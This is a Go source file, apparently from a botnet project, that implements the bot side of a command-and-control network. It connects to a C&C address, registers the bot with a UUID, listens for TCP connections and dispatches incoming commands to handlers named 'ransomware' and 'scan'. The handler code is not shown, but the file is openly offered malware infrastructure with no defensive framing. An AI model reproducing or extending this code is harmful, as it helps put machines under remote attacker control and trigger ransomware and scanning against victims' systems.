package tcp

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"

	uuid "github.com/satori/go.uuid"
	"github.com/threeaccents/botnet"
)

//BotService is
type BotService struct {
	Bot           *botnet.Bot
	PortScanner   botnet.PortScanner
	CryptoService botnet.CryptoService
}

//NewBot is
func NewBot(ccAddr string, portscan botnet.PortScanner) (*BotService, error) {
	conn, err := net.Dial("tcp", ccAddr)
	if err != nil {
		return nil, fmt.Errorf("%s is not available", ccAddr)
	}
	bot := &botnet.Bot{
		ID:      uuid.NewV4().Bytes(),
		Host:    strings.Split(conn.LocalAddr().String(), ":")[0],
		Port:    strings.Split(conn.LocalAddr().String(), ":")[1],
		CCAddr:  ccAddr,
		IsAlive: true,
	}
	conn.Close()

	svc := &BotService{
		Bot:         bot,
		PortScanner: portscan,
	}

	if err := svc.GenesisCmd(bot); err != nil {
		return nil, err
	}

	return svc, nil
}

//Listen is
func (b *BotService) Listen() {
	listener, err := net.Listen("tcp", b.Bot.Addr())
	if err != nil {
		botnet.Err(err, "listening on addr", b.Bot.Addr())
		os.Exit(1)
	}
	botnet.Msg("listening on", b.Bot.Addr())

	b.acceptConnections(listener)
}

func (b *BotService) acceptConnections(l net.Listener) {
	for {
		conn, err := l.Accept()
		if err != nil {
			botnet.Err(err, "accepting connection")
			continue
		}

		go b.handleConnection(conn)
	}
}

func (b *BotService) handleConnection(conn net.Conn) {
	var req bytes.Buffer
	if _, err := io.Copy(&req, conn); err != nil {
		log.Panic(err)
	}
	command := bytesToCommand(req.Bytes()[:commandLength])

	switch command {
	case "ransomware":
		b.HandleRansome(req.Bytes()[commandLength:])
	case "scan":
		b.HandleScan(req.Bytes()[commandLength:])
	}
	conn.Close()
}
